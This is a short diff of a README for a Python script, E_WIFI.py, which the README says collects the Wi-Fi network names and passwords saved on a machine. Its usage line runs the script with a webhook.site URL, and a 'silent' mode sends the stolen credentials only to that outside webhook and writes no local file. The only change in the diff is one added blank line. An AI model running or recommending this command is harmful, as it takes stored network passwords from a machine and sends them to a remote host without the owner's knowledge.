@@ -46,6 +46,7 @@ Creates a txt with the WIFI's ssid and passwords stored in the local machine
 Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local
 
 silent: Only webhook, no txt file
+
 python3 E_WIFI.py -u https://webhook.site/yoururl -o
 
 type --help for more detailed info
